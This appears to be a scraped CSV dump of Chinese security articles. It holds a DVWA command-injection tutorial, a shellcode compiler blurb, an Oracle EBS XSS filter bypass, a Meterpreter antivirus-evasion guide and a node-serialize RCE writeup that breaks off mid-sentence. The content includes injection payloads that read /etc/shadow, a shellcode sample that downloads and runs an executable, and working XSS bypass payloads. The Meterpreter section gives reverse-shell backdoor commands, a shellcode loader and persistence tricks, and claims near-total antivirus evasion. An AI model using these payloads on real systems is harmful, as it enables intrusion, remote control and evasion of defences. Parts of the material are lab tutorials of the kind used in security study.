网络攻防小组已获授权，转载请注明来自网络攻防小组 】","2017-03-29 12:46:16","网络安全","看破了一个网络诈骗犯，并向他随手丢了一个木马病毒。。。","http://nsoad.com/Article/Network-security/20170329/1123.html"
"5ccbfad04f2f0a0a7a69c0ca","你是否也遭受着虚假警报占用大量工作时间的困扰？雷神Foreground Security的高管Carl Manion 2016年11月7日发布博文分享了他应对虚假警报、避免时间浪费的实用经验。虚假警","kong","你是否也遭受着虚假警报占用大量工作时间的困扰？雷神Foreground Security的高管Carl Manion 2016年11月7日发布博文分享了他应对虚假警报、避免时间浪费的实用经验。虚假警报指的是那些让你陷入担忧，但进一步调查后发现虚惊一场的警报通知。刚开始人们觉得这些误报好像只会带来轻微的不便，但如果每天都有成百上千次误报产生，你会发现它们几乎占去了你每天四分之三甚至更多的时间！更糟糕的是，这的确发生在全球大多数安全操作中心（SOC）网络安全分析师的身上，因为他们一直遵循着传统的、被动的威胁监测方式。在大多数SOC中，误报是一个关键难题。它们不但需要花一定的时间和资源来处理，而且还会分散安全分析师处理真正安全威胁的精力。这些分析师可能会因为每天处理许许多多的虚假警报而产生“警报疲劳症”，对各种警报的敏感度降低，最终遗漏真正会发生网络攻击行为的迹象。  那么什么原因造成了虚假警报呢？误报最常见的成因是配置不良或调整不佳的安全工具，例如SIEM、入侵检测系统、入侵防御系统、终端检测与响应工具。这些系统利用了很多基于一套预定义规则（如已知签名、模式、预期的用户行为等）的攻击检测技术。当这些工具中的某个规则、签名或模式定义得太宽泛或缺少某些逻辑时通常就会产生误报。根据当前逻辑识别安全事件，就容易产生虚假的威胁事件报警。下面推荐7个基本习惯可供企业或组织参考借鉴，最大程度地降低误报率：1）主动出击。将你的威胁管理方式变得积极主动，如果你所做的就是等待警报响起和警报消失，那么你的时间都会花在误报的处理上而不是发现真正的威胁。主动发现威胁，这是检测最新网络威胁唯一经过验证的方法。2）目标优先。正确使用报警技术能够大大提高我们识别可疑或恶意活动的能力。但很多企业、组织大范围地应用该技术，忽视了重点关注你计划检测的威胁类型这一关键点。评估你所在企业的风险与安全需求，然后再将报警技术应用于最高风险威胁事件。重点关注你的最终目标，也就是和你计划检测最相关的威胁类型，这会大大降低误报率。3）高风险警报优先。优先化是SOC减少因误报而造成时间浪费最好的工具之一。可靠性最高并带有检测高风险事件的报警无疑应该被列为优先处理项。利用这种方法分析人员就可以根据优先级分别处理，确保首先解决风险最高的事件。4）双赢思维。把人们看做是一个合作性的群体而不是竞争性的。选择合作性的情报源，为你的安全操作中心带来不同的真实性、相关性和价值资源。（当然要进行明智地选择；如果不够小心，盲目地整合情报站点资源而不评估其真实性，这样产生的误报率会对安全操作中心带来负面影响。）5）注重理解。处理误报问题首先应该全面理解已有工具想要处理的是什么威胁以及它的运作方式。使用某个工具时，你也应该彻底明确你部署它的原因，而不是根据“常见”情况而作出假设，切忌在默认设置的情况下安装某个工具。6）协同处理（利用相关性）。很多情况下，一个事件可能不足以引起重视，除非它与其它利益事件一起被观察到。出现这样的情况时，你应该使用一套定义清晰的相关性规则，若各个事件满足所有相关性标准，那么只发送一条警报至分析师的处理安排表中。7）保持更新。复查以前的警报，不断吸取教训，更好地制定报警规则。警报复查能够让你明白如何调整、改善现有规则。如今的网络威胁十分复杂，降低误报率需要智能化、有针对性的警报逻辑来提取重要事件。因此持续调整这种逻辑非常重要。虽然虚假警报在网络安全操作中总是会存在，但通过遵循以上7条好习惯，降低虚假警报的数量还是有可能的。以下是描述这7个习惯的汉化版信息图。","2016-11-14 17:54:47","安全管理","企业如何应对安全产品“误报”？","http://nsoad.com/news/securityissue/20161114/770.html"
"5ccbfad04f2f0a0a7a69c0cb","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误","Kong","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。    DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。之前介绍了Brute Force模块的内容（http://www.freebuf.com/articles/web/116437.html），本文介绍的是Command Injection模块，后续教程会在之后的文章中给出。Command InjectionCommand Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。下面对四种级别的代码进行分析。Low服务器端核心代码&lt;?php if( isset( $_POST[ 'Submit' ]  ) ) {     // Get input     $target = $_REQUEST[ 'ip' ];     // Determine OS and execute the ping command.     if( stristr( php_uname( 's' ), 'Windows NT' ) ) {         // Windows         $cmd = shell_exec( 'ping  ' . $target );     }     else {         // *nix         $cmd = shell_exec( 'ping  -c 4 ' . $target );     }     // Feedback for the end user     echo ""&lt;pre&gt;{$cmd}&lt;/pre&gt;""; } ?&gt; 相关函数介绍 stristr(string,search,before_search)stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。php_uname(mode)这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a”    （此为默认，包含序列”s n r v m”里的所有模式），”s        ”（返回操作系统名称），”n”（返回主机名），”            r”（返回版本名称），”v”（返回版本信息），                ”m”（返回机器类型）。可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。漏洞利用window和linux系统都可以用&amp;&amp;来执行多条命令127.0.0.1&amp;&amp;net user  Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。Medium服务器端核心代码&lt;?php if( isset( $_POST[ 'Submit' ]  ) ) {     // Get input     $target = $_REQUEST[ 'ip' ];     // Set blacklist     $substitutions = array(         '&amp;&amp;' =&gt; '',         ';'  =&gt; '',     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );     // Determine OS and execute the ping command.     if( stristr( php_uname( 's' ), 'Windows NT' ) ) {         // Windows         $cmd = shell_exec( 'ping  ' . $target );     }     else {         // *nix         $cmd = shell_exec( 'ping  -c 4 ' . $target );     }     // Feedback for the end user     echo ""&lt;pre&gt;{$cmd}&lt;/pre&gt;""; } ?&gt;可以看到，相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;”    、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。漏洞利用1、127.0.0.1&amp;net user因为被过滤的只有”&amp;&amp;”与”    ;”，所以”&amp;”不会受影响。这里需要注意的是”&amp;&amp;”与”    &amp;”的区别：Command 1&amp;&amp;Command 2先执行Command 1，执行成功后执行Command 2，否则不执行Command 2Command 1&amp;Command 2先执行Command 1，不管是否成功，都会执行Command 22、由于使用的是str_replace把”&amp;&amp;”    、”;”替换为空字符，因此可以采用以下方式绕过：127.0.0.1&amp;;&amp;ipconfig这是因为”127.0.0.1&amp;;&amp;ipconfig”中的”    ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig”        ，会成功执行。High服务器端核心代码&lt;?php if( isset( $_POST[ 'Submit' ]  ) ) {     // Get input     $target = trim($_REQUEST[ 'ip' ]);     // Set blacklist     $substitutions = array(         '&amp;'  =&gt; '',         ';'  =&gt; '',         '|  ' =&gt; '',         '-'  =&gt; '',         '$'  =&gt; '',         '('  =&gt; '',         ')'  =&gt; '',         '`'  =&gt; '',         '||' =&gt; '',     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );     // Determine OS and execute the ping command.     if( stristr( php_uname( 's' ), 'Windows NT' ) ) {         // Windows         $cmd = shell_exec( 'ping  ' . $target );     }     else {         // *nix         $cmd = shell_exec( 'ping  -c 4 ' . $target );     }     // Feedback for the end user     echo ""&lt;pre&gt;{$cmd}&lt;/pre&gt;""; } ?&gt; 相比Medium级别的代码，High级别的代码进一步完善了黑名单，但由于黑名单机制的局限性，我们依然可以绕过。漏洞利用黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是    ”|”成了“漏网之鱼”。127.0.0.1|net userCommand 1 | Command 2“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。Impossible服务器端核心代码&lt;?php if( isset( $_POST[ 'Submit' ]  ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $target = $_REQUEST[ 'ip' ];     $target = stripslashes( $target );     // Split the IP into 4 octects     $octet = explode( ""."", $target );     // Check IF each octet is an integer     if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {         // If all 4 octets are int's put the IP back together.         $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];         // Determine OS and execute the ping command.         if( stristr( php_uname( 's' ), 'Windows NT' ) ) {             // Windows             $cmd = shell_exec( 'ping  ' . $target );         }         else {             // *nix             $cmd = shell_exec( 'ping  -c 4 ' . $target );         }         // Feedback for the end user         echo ""&lt;pre&gt;{$cmd}&lt;/pre&gt;"";     }     else {         // Ops. Let the user name theres a mistake         echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;';     } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 相关函数介绍stripslashes(string)stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。explode(separator,string,limit)把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。is_numeric(string)检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。","2016-10-21 16:38:22","Web安全","新手指南：DVWA-1.9全级别教程之Command Injection","http://nsoad.com/Article/web/20161021/621.html"
"5ccbfad04f2f0a0a7a69c0cc","Shellcode Compiler 是一款能将 C/C++ 代码编译成体积小，位置无关和无 NULL 字节的 Windows shellcode 的工具。它能以用户友好的方式调用任何 Windows API 函数。","kong","项目地址：https://github.com/NytroRST/ShellcodeCompilerShellcode Compiler 是一款能将 C/C++ 代码编译成体积小，位置无关和无 NULL 字节的 Windows shellcode 的工具。它能以用户友好的方式调用任何 Windows API 函数。Shellcode Compiler 将输入的源文件用自己的编译器来解释代码，并生成一个由 NASM（http://www.nasm.us/）汇编生成的汇编文件。Shellcode Compiler 与 2016 年 11 月在罗马尼亚的 DefCamp 安全会议上发布。命令行选项    -h (--help)      : Show this help message    -v (--verbose)   : Print detailed output    -t (--test)      : Test (execute) generated shellcode    -r (--read)      : Read source code file    -o (--output)    : Output file of the generated binary shellcode    -a (--assembbly) : Output file of the generated assembly code源码示例    function URLDownloadToFileA(""urlmon.dll"");    function WinExec(""kernel32.dll"");    function ExitProcess(""kernel32.dll"");    URLDownloadToFileA(0,""https://site.com/bk.exe"",""bk.exe"",0,0);    WinExec(""bk.exe"",0);    ExitProcess(0);调用示例ShellcodeCompiler.exe -r Source.txt -o Shellcode.bin -a Assembly.asm一些限制不能使用调用 API 的返回值不能使用指针或缓冲区不能声明变量而所有这些限制将尽快修复，然而还会存在一些限制。这是一个 Alpha 版本。欢迎提交 bug 和建议。作者Ionut Popescu (@NytroRST) 是 SecureWorks (www.secureworks.com) 的高级渗透测试工程师。","2016-12-06 13:58:01","安全工具","Shellcode Compiler - 一款易用的 Shellcode 编译工具","http://nsoad.com/Security-tools/20161206/tools-889.html"
"5ccbfad04f2f0a0a7a69c0cd","若 Web 应用在后端处理了一些 XML 文件，而且存在 XSS 漏洞的话，那么或许能使用 XML 实体来绕过常用 web 浏览器的 XSS 过滤器，比如Chrome， IE 和 Safari 浏览器。同样在","silence","若 Web 应用在后端处理了一些 XML 文件，而且存在 XSS 漏洞的话，那么或许能使用 XML 实体来绕过常用 web 浏览器的 XSS 过滤器，比如Chrome， IE 和 Safari 浏览器。同样在 Firefox 浏览器下依然有效，不过显然它没有 XSS 过滤器。绕过常用浏览器的 XSS 过滤器Oracle's eBusiness Suite 12.x 以及更早版本中的 BneApplicationService servlet 存在跨站脚本漏洞，这个最初与外部 XML 实体漏洞（XXE）同时被发现。如果请求以下的URL：https://example.com/oa_servlets/oracle.apps.bne.webui.BneApplicationService?bne:page=Bne MsgBox&amp;bne:messagexml=XXX  将会得到如下响应：The following error has occurredException Name: oracle.apps.bne.exception.BneFatalException -oracle.apps.bne.exception.BneFatalException: XML parse error in file at line 1, character 1.Log File Bookmark: 392699那么我们可以修改请求把它包装在一个 XML 标签中。https://example.com/oa_servlets/oracle.apps.bne.webui.BneApplicationService?bne:page=Bne MsgBox&amp;bne:messagexml=&lt;FOO&gt;XXXXX&lt;/FOO&gt;  现在我们会得到以下响应：he following error has occurredException Name: oracle.apps.bne.exception.BneFatalException - java.lang.ClassCastException:oracle.xml.parser.v2.XMLText cannot be cast to oracle.xml.parser.v2.XMLElementLog File Bookmark: 602808因此我们需要弄清楚在后端的类中发生了什么。如果看源代码的话，我们将会发现在createBodyBneStyle方法中如下内容：XMLDocument localXMLDocument = BneXMLDomUtils.parseString(this.m_messagesXML);XMLElement localXMLElement1 =  (XMLElement)localXMLDocument.getDocumentElement();      NodeList localNodeList = localXMLElement1.getChildNodes();      for (int i = 0; i &lt; localNodeList.getLength(); i++)      {        String str1 = """";        String str2 = """";        String str3 = """";        String str4 = null;        String str5 = null;        Node localNode = null;        XMLElement localXMLElement2 = (XMLElement)localNodeList.item(i);        NamedNodeMap localNamedNodeMap = localXMLElement2.getAttributes();        localNode = localNamedNodeMap.getNamedItem(""bne:type"");        if (localNode != null) {          str1 = localNode.getNodeValue();}localNode = localNamedNodeMap.getNamedItem( b""ne:text ""); if (localNode != null) {            str2 = localNode.getNodeValue();        }        localNode = localNamedNodeMap.getNamedItem(""bne:value"");        if (localNode != null) {          str3 = localNode.getNodeValue();        }localNode = localNamedNodeMap.getNamedItem( b""ne:cause ""); if (localNode != null) {            str4 = localNode.getNodeValue();        }        localNode = localNamedNodeMap.getNamedItem(""bne:action"");        if (localNode != null) {          str5 = localNode.getNodeValue();        }        if ((!str1.equalsIgnoreCase(""DATA"")) &amp;&amp; (str2 != """"))        { localStringBuffer.append(""&lt;p&gt;&lt;b&gt;"" + str2 + ""&lt;/b&gt;&lt;/p&gt;""); localStringBuffer.append(""&lt;p&gt;"" + str4 + ""&lt;/p&gt;"");我们可以看到，如果我们设置 bne:text的值不是词'data‘，那么它和 bne:cause的值将会返回给浏览器。这便允许我们创建一条不存在解析错误的查询字符串：https://example.com/oa_servlets/oracle.apps.bne.webui.BneApplicationService?bne:page=Bne MsgBox&amp;bne:messagexml=&lt;message&gt;&lt;bne:a xmlns:bne=""foo""%  20bne:text=""ABCDEF"" bne:cause=""GHIJKL""&gt;&lt;/bne:a &gt;&lt;/message&gt;  我们马上能看到这是很容易产生 XSS 的。我们简单地试一下；我们发送 &lt;IMG SRC=/x onerror=alert(1)&gt; 看看发生了什么：https://example.com/oa_servlets/oracle.apps.bne.webui.BneApplicationService?bne:page=Bne MsgBox&amp;bne:messagexml=&lt;message&gt;&lt;bne:a xmlns:bne=""foo"" bne:text=""ABCDEF"" bne:cause=""&lt;IMG SRC=/x onerror=alert(1)&gt;""&gt;&lt;/bne:a&gt;&lt;/message&gt;  Reserved program word &lt;message&gt;&lt;bne:a xmlns:bne=""foo"" bne:text=""ABCDEF""bne:cause=""&amp;lt;I ... detected.Press the Back button and remove the reserved program word. Contact your system administrator if thevalue cannot be changedOK，所以 BneApplicationService 是有我们需要绕过的内置 XSS 过滤器的。回想一下我们最初找到的XXE处理漏洞。尝试使用外部 XML 实体（测试失败，因此并不受XXE攻击影响）之后，它启发我使用内部XML实体绕过 XSS 过滤器。这将会使得我们通过分解成占位符之后重建的方法对攻击进行伪装。但我们先看看什么是不被允许的。我们先去掉第一个左尖括号：https://example.com/oa_servlets/oracle.apps.bne.webui.BneApplicationService?bne:page=Bne MsgBox&amp;bne:messagexml=&lt;message&gt;&lt;bne:a xmlns:bne=""foo"" bne:text=""ABCDEF"" bne:cause=""IMG SRC=/x onerror= alert(1)&gt;""&gt;&lt;/bne:a&gt;&lt;/message&gt;Ok, 看来可行。因此绕过 BneApplicationService 内置的过滤器，我们仅需要内部 XML 实体生成左尖括号即可，因此我们天津一个内部实体叫 xxx ，分配给它尖括号的值:&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;&lt;!DOCTYPE DWL [&lt;!ENTITY xxx""&amp;lt;""&gt;]&gt;  https://example.com/oa_servlets/oracle.apps.bne.webui.BneApplicationService?bne:page=Bne MsgBox&amp;bne:messagexml= &lt;?xml version=""1.0"" encoding="" UTF-8""?&gt;&lt;!DOCTYPE DWL [&lt;!ENTITY xxx "" &amp;lt;""&gt;]&gt;% 3Cmessage&gt;&lt;bne:a xmlns:bne=""foo""  bne:text=""ABCDEF"" bne:cause=""&amp;xxx;IMG SRC=/x on error=alert(1)&gt;""&gt;&lt;/bne:a&gt;&lt;/message&gt;我们的 alert(1)并没有执行，可想而知，因为 Chrome 的XSS过滤器发现了攻击行为：那么我们必须绕过 Chrome 的 XSS 过滤器了。我们同样也可以使用内部XML实体来解决。我们创建 IMG, SRC和error中的one实体。这些实体会被 web 服务器 的XML 解析器处理重组，但不会被 Chrome 当做反射型 XSS 攻击进行处理。https://example.com/oa_servlets/oracle.apps.bne.webui.BneApplicationService?bne:page=Bne MsgBox&amp;bne:messagexml=&lt;?xml version=""1.0"" encoding=""UT F-8""?&gt;&lt;!DOCTYPE DWL [&lt;!ENTITY xxx ""&amp;lt;% 22&gt;&lt;! ENTITY yyy ""IMG""&gt;&lt;!ENTITY zzz ""SRC ""&gt;&lt;!ENTITY ppp ""one""%  3E]&gt;&lt;message&gt;&lt;bne: a xmlns:bne=""foo"" bne:text=""ABCDEF"" bne:caus e=""&amp;xxx;&amp;yyy; &amp;zzz;=/x &amp;ppp;rror=alert(1)&gt;""&gt;&lt;/bne:a &gt;&lt;/message&gt;  在以下浏览器测试成功：Firefox version 47, Chrome 51, IE 11, Safari 9.1.1","2016-10-20 19:11:04","Web安全","使用 XML 内部实体绕过 Chrome 和 IE 的 XSS 过滤器","http://nsoad.com/Article/web/20161020/615.html"
"5ccbfad04f2f0a0a7a69c0ce","Morphus实验室讲述了这样一个故事，在某周六的早上，你作为一家大公司的CSO（首席安全官），突然开始收到了雪片般飞来的消息。他们告诉你有游客在访问了你公司的网址后，","Kong","0×01 meterpreter简介MetasploitFramework是一个缓冲区溢出测试使用的辅助工具，也可以说是一个漏洞利用和测试平台，它集成了各种平台上常见的溢出漏洞和流行的shellcode，并且不断更新，使得缓冲区溢出测试变的方便和简单。需要说明的是meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令，经常出现什么sending stager error，稍等片刻就好。0×02 生成后门在旧的metasploit中，生成payload是用msfpayload+msfencode，之后rapid7整合了这两个命令变成了msfvenom，并添加了更多的功能，下面是用msfvenom生成backdoor的实例。msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.1.200 lport=4444 -f exe &gt; /root/Desktop/Green_m.exe这样可以生成一个使用tcp协议反向连接到192.168.1.200的4444端口的meterpreter的后门。这样生成的exe可以运行，但是会被杀掉。0×03 生成shellcode免杀长话短说，手动编译meterpreter并对shellcode进行编码就能绕过静态查杀，meterpreter本身就是直接加载进内存并且有编码，绕过动态查杀基本没问题(当然你也可以使用veil-evasion，不过效果不怎么好)。msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.1.200 lport=4444   -f c上述命令生成在之前的基础上生成基于c语言格式的shellcode，通过e参数指定编码方式，i参数指定编码次数，b参数去除指定代码，一般是空代码或者错误代码，-f指定生成格式。unsigned char buf[] = ""shellcode is here"";main(){    ( (void(*)(void))&amp;buf)();}这种方式vc++6.0能够成功编译，但是vs编译会报错，可以换成：main(){    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, buf, sizeof(buf));    ((void(*)())Memory)();}还有很多其他的方法，这里就不一一测试了。友情提示：在实战情况下，免杀效果会根据编译器和系统环境而变化，可以多准备一些环境进行免杀工作。通过上述方法编译生成的exe可以绕过几乎100%杀软，包括360，卡巴斯基，小红伞等杀软。0×04 选择payload进行免杀上面生成shellcode的方式是针对杀软静态免杀的，接下来说到动态行为免杀。在对市面上主流的杀软进行测试的过程中，发现symantec会在meterpreter回连成功，从metasploit里接受数据的时候报毒。无论是自己手动编码编译还是msf自动生成的exe都会这样被报毒。经过笔者自己测试，使用reverse_https等payload可以anti symantec。msfvenom -p  windows/meterpreter/reverse_https  lhost=192.168.1.200 lport=443   -f c但是需要在metasploit设置：set EnableStageEncoding trueset stageencoder x86/fnstenv_movset stageencodingfallback false将控制端向被控制端发送的stage进行编码，从而绕过symantec的查杀。同样，使用reverse_tcp_rc4也有同样的效果，而且不用设置stageencoder选项，更稳定更方便。msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=192.168.1.200 lport=4444 RC4PASSWORD=Green-m  -f c利用rc4对传输的数据进行加密，密钥在生成时指定，在监听的服务端设置相同的密钥。就可以在symantec眼皮地下执行meterpreter。这里做一个抛砖引玉的作用，其他payload的查杀效果需要各大黑客自己去测试。0×05 meterpreter常驻的免杀常见的添加meterpreter 常驻的方法无非两种：persistence和metsvc。这两种方法效果还是不错的，不过在面对杀软的时候无能为力，几乎100%被杀。下面介绍几种能绕过杀软的添加自启动方法。1.使用exploit/windows/local/registry_persistence通过用户自己指定payload及编码方式，将shellcode添加到注册表，然后再利用powershell加载该shellcode，成功运行meterpreter。由于加载的payload是由metasploit指定，每次都不一定一样，这个方法在面对大部分主流AV的时候简直强大，只要不监视注册表操作不限制powershell，几乎不会被杀。同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence，有的效果也不错，如添加计划任务启动的功能，但或多或少都有一些限制，总体说来不如上面讲到的方法。2.利用powershellpowershell因为其特性，被很多杀毒软件直接忽视，因此用这个方法经常能达到出其不意的效果其实这个方式和第一种原理都是一样，不过自定义的powershell脚本效果更佳。这里可以利用一个工具powersploit，下面用它来示范一个简单的例子。Import-Module .\Persistence\Persistence.psm1$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle$UserOptions =New-UserPersistenceOption -ScheduledTask -HourlyAdd-Persistence -FilePath .\Green_m.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose其中Green_m.ps1是加载有payload的powershell脚本文件，你可以用msf生成一个加载meterpreter的ps1文件。msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.200 lport=4444 -f psh-reflection -o Green_m.ps1当然你也可以选择不执行powershell文件而直接执行某个PE文件，可以通过将代码赋予变量来执行。http://aa001.com/powersploit还有其他非常有用的功能，有兴趣可以自己去github或者使用get-help查询。3.手动编写只要是工具用得太多都难免被AV发现，这个时候就需要手动编写自启动功能。手动添加自启动，自删除，再改个图标后缀技能骗过杀软也能骗过人眼，扩展一下就是个大马，这里就不多说了。0×06 总结meterpreter因为其简单多变的结构，强大的功能，在渗透中面对未知杀软环境的情况下效果不错。注：本文所做所有测试不保证完全有效，仅供参考。微博地址：微博链接","2016-11-07 14:35:25","Web安全","Meterpreter免杀技巧分享（亲测有效）","http://nsoad.com/Article/web/20161107/711.html"
"5ccbfada4f2f0a0a7a69c0cf","本文阐述了一种利用 Node.JS 代码执行漏洞的方法。在 JavaScript 中，所有的对象都是基于 Object，所有的对象都继承了Object.prototype的属性和方法，它们可以被覆盖。","Petko D. Petkov","原文链接：http://blog.websecurify.com/2017/02/hacking-node-serialize.html   原作者：Petko D. Petkov译：Holic (知道创宇404安全实验室)   网络攻防小组Kong.整理发布前言：本文阐述了一种利用 Node.JS 代码执行漏洞的方法。在 JavaScript 中，所有的对象都是基于 Object，所有的对象都继承了Object.prototype的属性和方法，它们可以被覆盖。通过覆盖 ServerResponse.prototype.end 方法，就可以操纵 express 在返回响应时执行的操纵而无须另开端口的bind shell 或 反弹 shell，类似 node 的 webshell。另一方面就是宣传作者的 rest 工具了 _(:з」∠)_。正文：几天前，我注意到了 opsecx 的一篇博文，这篇文章讲了如果利用 nodejs 模块 node-serialize 的 RCE（远程命令执行）漏洞，然而有一点我很在意，就是利用 Burp 的过程过于繁琐 - 这工具很强的 - 不过我认为可以做的更优雅。在本文中，我想表达一下个人对这个独特的 RCE 的看法，也许将来会有所帮助 - 大概对你的个人研究会有些用。攻击面在开始之前，先评估一下攻击面是很有用的。本 node-serialize 模块同样适用。撰写本文时，该模块每月约有 2000 次下载，其中有 9 个包不需要其它的子依赖。下面是所依赖模块的列表：cdlib, cdlibjs, intelligence, malice, mizukiri, modelproxy-engine-mockjs, node-help, sa-sdk-node, scriby, sdk-sa-node, shelldoc, shoots。不分析代码是无法断定这些应用是否也存在漏洞，但本着挖掘漏洞的原则，我假设他们是有漏洞的。尽管如此，更重要的是，我们还没回答“该模块扩散得有多广泛”的问题。每月 2000 次的下载量或许可以说明很多事情，不过很难估计这个数字后面的应用程序数量。去 github 和 google 大致浏览一下即可确定答案所在，这也正是有趣之处。GitHub 搜索显示存在 97 个潜在的可能有漏洞的模块/应用，这些模块可能是个人使用，并未在 npmjs.com 上注册。通过浏览代码的方法可以快速确定了该问题存在的广泛与否。我还神奇地发现它竟然与口袋妖怪（Pokémon）有关。快去一探究竟！我将有关情况报告给 https://nodesecurity.io/ 以提供支持，这是报告此安全问题目前唯一的途径，尤其是关于 NodeJS 模块系统的相关问题。它是个免费的开源项目。测试环境目前为止，我们正研究一个有利用潜力的漏洞，从公共安全的视角来看挺不错。那么我们进入更学术的一面，进而利用之。为了测试该 bug ，我们需要一个存在漏洞的应用程序。opsecx 提供了一个示例，我们将在本次练习中使用它。代码颇为简单。var express = require('express');  var cookieParser = require('cookie-parser');  var escape = require('escape-html');  var serialize = require('node-serialize');var app = express();app.use(cookieParser())app.get('/', function(req, res) {      if (req.cookies.profile) {        var str = new Buffer(req.cookies.profile, 'base64').toString();        var obj = serialize.unserialize(str);        if (obj.username) {            res.send(""Hello "" + escape(obj.username));        }    } else {        res.cookie('profile', ""eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0="", {            maxAge: 900000,            httpOnly: true        });        res.send(""Hello stranger"");    }});app.listen(3000);  你需要以下 package.json 安装对应模块（npm install）。{  ""dependencies"": {    ""cookie-parser"": ""^1.4.3"",    ""escape-html"": ""^1.0.3"",    ""express"": ""^4.14.1"",    ""node-serialize"": ""0.0.4""  }}那么我们进入关键部分吧。从代码中可以看到，本例 Web 应用正在使用用户配置（profile）设置 cookie，该配置使用了存在漏洞的模块进行序列化对象。然后进行 base64 编码。要想知道 base64 字符串解包后是什么样的，可以试试 ENcoder。利用步骤现在我们有了一个有效请求，然后改造请求利用漏洞。首先，弄清 node-serialize 中的漏洞原理。看一眼源代码便一目了然，模块的相关函数如下所示：} else if(typeof obj[key] === 'function') {  var funcStr = obj[key].toString();  if(ISNATIVEFUNC.test(funcStr)) {    if(ignoreNativeFunc) {      funcStr = 'function() {throw new Error(""Call a native function unserialized"")}';    } else {      throw new Error('Can\'t serialize a object with a native function property. Use serialize(obj, true) to ignore the error.');    }  }  outputObj[key] = FUNCFLAG + funcStr;} else {一旦调用 unserialize 方法，问题就会暴露出来，具体行号点此。if(obj[key].indexOf(FUNCFLAG) === 0) {    obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');} else if(obj[key].indexOf(CIRCULARFLAG) === 0) {如果我们创建一个包含一 _$$ND_FUNC$$_ 为开头的任意 JSON 对象，我们就可以远程执行代码，因为它使用了 eval 。我们可以使用以下设置来测试这一点。如果成功执行，当然它理应成功，你会收到一个错误，因为服务器在请求完成之前退出了。现在我们有了代码执行，但我们可以做到更好。关键所在我个人感觉 opsecx 博客中提到的那点利用方式略显粗犷了。出于演示目的，它当然已经完全够用了，考虑到我们在 node 进程内已经实现了 eval 操作，我们完全可以搞更多事情，来获得更优雅的 